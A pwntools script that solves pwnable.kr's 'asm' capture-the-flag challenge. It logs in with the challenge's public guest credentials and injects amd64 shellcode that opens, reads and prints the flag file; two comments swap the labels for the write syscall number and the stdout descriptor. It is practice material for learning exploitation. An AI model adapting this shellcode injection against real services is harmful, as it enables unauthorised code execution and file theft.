from pwn import *

# asm
host = 'pwnable.kr'
user = 'asm'
password = 'guest'
port = 2222

filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

# Notes
#  * you can't do `mov rdi, rip` for _reasons_, but
#    `lea rdi, [rip]` does what we want

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  p = s.process(['nc', '0', '9026'])
  print p.recv()
  context.update(arch='amd64', os='linux')
  shellcode = ''
  shellcode += asm('lea rdi, [rip]') # get current inst. pointer
  shellcode += asm('add rdi, 51')    # offset it to point to our filename below
  shellcode += asm('mov rax, 2')     # syscall number for open()
  shellcode += asm('syscall')        # open("this_is...", 0)
  shellcode += asm('mov rsi, rdi')   # write to the buffer with our filename
  shellcode += asm('mov rdi, rax')   # read from returned file desc. from open()
  shellcode += asm('mov rdx, 30')    # read 30 bytes of data
  shellcode += asm('mov rax, 0')     # syscall number for read()
  shellcode += asm('syscall')        # read(fd, buf, 30)
  shellcode += asm('mov rax, 1')     # stdout is 1
  shellcode += asm('mov rdi, 1')     # syscall number for write
  shellcode += asm('syscall')        # write(STDOUT, buf, 30)
  shellcode += filename + '\x00'     # our buffer, which initially has filename
  p.send(shellcode)                  # ended with a null byte
  print p.recv()

if __name__ == '__main__':
  attack()
